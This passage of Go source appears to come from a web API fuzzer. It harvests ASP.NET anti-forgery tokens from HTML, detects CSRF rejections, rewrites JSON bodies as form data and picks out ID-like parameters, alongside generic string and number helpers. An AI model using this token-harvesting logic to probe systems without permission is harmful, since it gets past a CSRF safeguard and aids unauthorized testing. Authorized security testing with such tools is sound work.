			return v
		}
	}
	return ""
}

func upsertFormField(body, key, value string) (string, bool) {
	if strings.TrimSpace(key) == "" {
		return body, false
	}
	vals, err := url.ParseQuery(strings.TrimSpace(body))
	if err != nil {
		vals = url.Values{}
	}
	old := vals.Get(key)
	if strings.TrimSpace(old) == strings.TrimSpace(value) && old != "" {
		return body, false
	}
	vals.Set(key, value)
	enc := vals.Encode()
	if enc == "" {
		return body, false
	}
	return enc, true
}

func antiForgeryHarvestPaths(path string) []string {
	norm := strings.TrimSpace(normalizePath(path))
	if norm == "" {
		return nil
	}
	if !strings.HasPrefix(norm, "/") {
		norm = "/" + norm
	}
	parts := splitPathTokens(norm)
	cands := []string{norm}
	if len(parts) >= 2 {
		cands = append(cands, "/"+strings.Join(parts[:len(parts)-1], "/"))
	}
	if len(parts) >= 3 {
		cands = append(cands, "/"+strings.Join(parts[:len(parts)-2], "/"))
	}
	if len(parts) >= 1 {
		cands = append(cands, "/"+parts[0])
	}
	out := make([]string, 0, len(cands))
	seen := map[string]struct{}{}
	for _, c := range cands {
		cc := strings.TrimSpace(normalizePath(c))
		if cc == "" {
			continue
		}
		if !strings.HasPrefix(cc, "/") {
			cc = "/" + cc
		}
		if _, ok := seen[cc]; ok {
			continue
		}
		seen[cc] = struct{}{}
		out = append(out, cc)
	}
	return out
}

func isAntiForgeryFailure(body string) bool {
	low := strings.ToLower(strings.TrimSpace(body))
	if low == "" {
		return false
	}
	if strings.Contains(low, "antiforgery") {
		return true
	}
	if strings.Contains(low, "__requestverificationtoken") || strings.Contains(low, "requestverificationtoken") {
		return true
	}
	if strings.Contains(low, "csrf") {
		return true
	}
	return false
}

func extractAntiForgeryTokens(body string, fieldName string) []string {
	if strings.TrimSpace(body) == "" {
		return nil
	}
	target := strings.ToLower(strings.TrimSpace(fieldName))
	if target == "" {
		target = "__requestverificationtoken"
	}
	out := make([]string, 0, 8)
	tags := reHTMLInputTag.FindAllString(body, -1)
	for _, tag := range tags {
		if !strings.Contains(strings.ToLower(tag), "requestverificationtoken") {
			continue
		}
		attrs := reHTMLAttrKV.FindAllStringSubmatch(tag, -1)
		if len(attrs) == 0 {
			continue
		}
		name := ""
		value := ""
		for _, m := range attrs {
			if len(m) < 4 {
				continue
			}
			k := strings.ToLower(strings.TrimSpace(m[1]))
			vraw := strings.TrimSpace(m[2])
			if vraw == "" {
				vraw = strings.TrimSpace(m[3])
			}
			v := html.UnescapeString(vraw)
			switch k {
			case "name":
				name = strings.ToLower(v)
			case "value":
				value = v
			}
		}
		if name == target || name == "requestverificationtoken" || name == "__requestverificationtoken" {
			value = normalizeValue(value)
			if isUsefulValue(value) {
				out = append(out, value)
			}
		}
	}
	return uniqStrings(out)
}

func canonicalContentType(headers map[string]string) string {
	return strings.ToLower(strings.TrimSpace(getHeaderCI(headers, "Content-Type")))
}

func setHeaderCI(headers map[string]string, name, value string) {
	for k := range headers {
		if strings.EqualFold(k, name) {
			delete(headers, k)
		}
	}
	headers[name] = value
}

func deleteHeaderCI(headers map[string]string, name string) {
	for k := range headers {
		if strings.EqualFold(k, name) {
			delete(headers, k)
		}
	}
}

func adaptJSONRequestToForm(headers map[string]string, body string) (map[string]string, string, bool) {
	ct := canonicalContentType(headers)
	if strings.Contains(ct, "application/x-www-form-urlencoded") || strings.Contains(ct, "multipart/form-data") {
		return headers, body, false
	}
	if ct != "" && !strings.Contains(ct, "application/json") {
		return headers, body, false
	}

	formBody, ok := jsonToFormBody(body)
	if !ok {
		return headers, body, false
	}
	setHeaderCI(headers, "Content-Type", "application/x-www-form-urlencoded")
	deleteHeaderCI(headers, "Content-Length")
	return headers, formBody, true
}

func isFormContentTypeMismatch(status int, body string) bool {
	if status < 500 {
		return false
	}
	low := strings.ToLower(body)
	if strings.Contains(low, "formvaluerequiredattribute") {
		return true
	}
	if strings.Contains(low, "formfeature.readform") {
		return true
	}
	if strings.Contains(low, "forms are available from requests with bodies like posts") {
		return true
	}
	if strings.Contains(low, "a form content-type of either application/x-www-form-urlencoded or multipart/form-data") {
		return true
	}
	return false
}

func jsonToFormBody(body string) (string, bool) {
	src := strings.TrimSpace(body)
	if src == "" {
		return "fuzz=false", true
	}
	var obj any
	if err := json.Unmarshal([]byte(src), &obj); err != nil {
		return "", false
	}
	vals := url.Values{}
	switch tv := obj.(type) {
	case map[string]any:
		if len(tv) == 0 {
			vals.Set("fuzz", "false")
		} else {
			addFormValue("", tv, vals, 0)
		}
	case []any:
		js, _ := json.Marshal(tv)
		vals.Set("value", string(js))
	default:
		vals.Set("value", toString(tv))
	}
	enc := vals.Encode()
	if enc == "" {
		enc = "fuzz=false"
	}
	return enc, true
}

func addFormValue(prefix string, v any, vals url.Values, depth int) {
	if depth > 2 {
		js, _ := json.Marshal(v)
		key := strings.Trim(prefix, ".")
		if key == "" {
			key = "value"
		}
		vals.Add(key, string(js))
		return
	}
	switch tv := v.(type) {
	case map[string]any:
		for k, sub := range tv {
			nk := k
			if prefix != "" {
				nk = prefix + "." + k
			}
			addFormValue(nk, sub, vals, depth+1)
		}
	case []any:
		js, _ := json.Marshal(tv)
		key := strings.Trim(prefix, ".")
		if key == "" {
			key = "value"
		}
		vals.Add(key, string(js))
	case nil:
		key := strings.Trim(prefix, ".")
		if key == "" {
			key = "value"
		}
		vals.Add(key, "")
	default:
		key := strings.Trim(prefix, ".")
		if key == "" {
			key = "value"
		}
		vals.Add(key, toString(tv))
	}
}

func canonicalKey(v string) string {
	return reNonAlnum.ReplaceAllString(strings.ToLower(strings.TrimSpace(v)), "")
}

func normalizeValue(v string) string {
	return strings.TrimSpace(v)
}

func isUsefulValue(v string) bool {
	if v == "" {
		return false
	}
	s := strings.TrimSpace(v)
	if s == "" || s == "null" || s == "None" || s == "{}" || s == "[]" {
		return false
	}
	return len(s) <= 256
}

func isIDLikeKey(k string) bool {
	ck := canonicalKey(k)
	return ck == "id" || strings.HasSuffix(ck, "id")
}

func contains(slice []string, v string) bool {
	for _, s := range slice {
		if s == v {
			return true
		}
	}
	return false
}

func anySliceToStrings(arr []any) []string {
	out := make([]string, 0, len(arr))
	for _, v := range arr {
		out = append(out, toString(v))
	}
	return out
}

func toString(v any) string {
	switch tv := v.(type) {
	case nil:
		return ""
	case string:
		return tv
	case bool:
		if tv {
			return "true"
		}
		return "false"
	case json.Number:
		return tv.String()
	case float64:
		if math.Trunc(tv) == tv {
			return strconv.FormatInt(int64(tv), 10)
		}
		return strconv.FormatFloat(tv, 'f', -1, 64)
	case float32:
		f := float64(tv)
		if math.Trunc(f) == f {
			return strconv.FormatInt(int64(f), 10)
		}
		return strconv.FormatFloat(f, 'f', -1, 64)
	case int:
		return strconv.Itoa(tv)
	case int64:
		return strconv.FormatInt(tv, 10)
	case uint64:
		return strconv.FormatUint(tv, 10)
	default:
		return fmt.Sprintf("%v", v)
	}
}

func toInt(v any) int {
	switch tv := v.(type) {
	case int:
		return tv
	case int64:
		return int(tv)
	case float64:
		return int(tv)
	case string:
		i, _ := strconv.Atoi(strings.TrimSpace(tv))
		return i
	default:
		return 0
	}
}

func toUsefulScalar(v any) (string, bool) {
	s := toString(v)
	s = normalizeValue(s)
	if !isUsefulValue(s) {
		return "", false
	}
	return s, true
}

func uniqStrings(in []string) []string {
	seen := map[string]struct{}{}
	out := make([]string, 0, len(in))
	for _, v := range in {
		if _, ok := seen[v]; ok {
			continue
		}
		seen[v] = struct{}{}
		out = append(out, v)
	}
	return out
}

func dedupStrings(in []string) []string { return uniqStrings(in) }

func filterUsefulStrings(in []string) []string {
	out := make([]string, 0, len(in))
	for _, v := range in {
		vv := normalizeValue(v)
		if !isUsefulValue(vv) {
			continue
		}
		if strings.HasPrefix(vv, "CUSTOM_PAYLOAD") {
			continue
		}
		out = append(out, vv)
	}
	return out
}

func splitNonAlnum(s string) []string {
	parts := strings.FieldsFunc(strings.ToLower(s), func(r rune) bool {
		return (r < 'a' || r > 'z') && (r < '0' || r > '9')
	})
	return parts
}

func singularize(t string) string {
	t = strings.TrimSpace(strings.ToLower(t))
	if len(t) <= 3 {
		return t
	}
	if strings.HasSuffix(t, "ies") && len(t) > 4 {
		return t[:len(t)-3] + "y"
	}
	if strings.HasSuffix(t, "ses") && len(t) > 4 {
		return t[:len(t)-2]
	}
	if strings.HasSuffix(t, "s") && !strings.HasSuffix(t, "ss") {
		return t[:len(t)-1]
	}
	return t
}

func setFromSlice(in []string) map[string]struct{} {
	out := map[string]struct{}{}
	for _, s := range in {
		if strings.TrimSpace(s) == "" {
			continue
		}
		out[s] = struct{}{}
	}
	return out
}

func mapKeys(m map[string]struct{}) []string {
	out := make([]string, 0, len(m))
	for k := range m {
		out = append(out, k)
	}
	return out
}

func appendUniqueInt(arr []int, v int) []int {
	for _, x := range arr {
		if x == v {
			return arr
		}
	}
	return append(arr, v)
}

func mapKeysAny(m map[string]any) []string {
	out := make([]string, 0, len(m))
	for k := range m {
		out = append(out, k)
	}
	return out
}

func weightedPick(weights []float64) int {
	if len(weights) == 0 {
		return -1
	}
	total := 0.0
	for _, w := range weights {
		if w > 0 {
			total += w
		}
	}
	if total <= 0 {
		return rand.Intn(len(weights))
	}
	r := rand.Float64() * total
	acc := 0.0
	for i, w := range weights {
		if w <= 0 {
			continue
		}
		acc += w
		if r <= acc {
			return i
		}
	}
	return len(weights) - 1
}

func sanitizeText(v string, maxLen int) string {
	if maxLen <= 0 {
		maxLen = 1024
	}
	s := strings.ToValidUTF8(v, "?")
	if len(s) > maxLen {
		s = s[:maxLen]
	}
	return s
}

func truncate(s string, n int) string {
	if n <= 0 || len(s) <= n {
		return s
	}
	if n <= 2 {
		return s[:n]
	}
	return s[:n-2] + ".."
}

func reverse(s string) string {
	r := []rune(s)
	for i, j := 0, len(r)-1; i < j; i, j = i+1, j-1 {
		r[i], r[j] = r[j], r[i]
	}
	return string(r)
}

func shuffleInts(a []int) {
	rand.Shuffle(len(a), func(i, j int) { a[i], a[j] = a[j], a[i] })
}

func clampInt(v, lo, hi int) int {
	if v < lo {
		return lo
	}
	if v > hi {
		return hi
	}
	return v
}

func clampFloat(v, lo, hi float64) float64 {
	if v < lo {
		return lo
	}
	if v > hi {
		return hi
	}
	return v
}

func minInt(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func maxInt(a, b int) int {
	if a > b {
		return a
	}
	return b
}

func filterIDLikePairs(in [][2]string) [][2]string {
	out := make([][2]string, 0, len(in))
	for _, kv := range in {
		if isIDLikeKey(kv[0]) {
			out = append(out, kv)
		}
	}
	return out
}
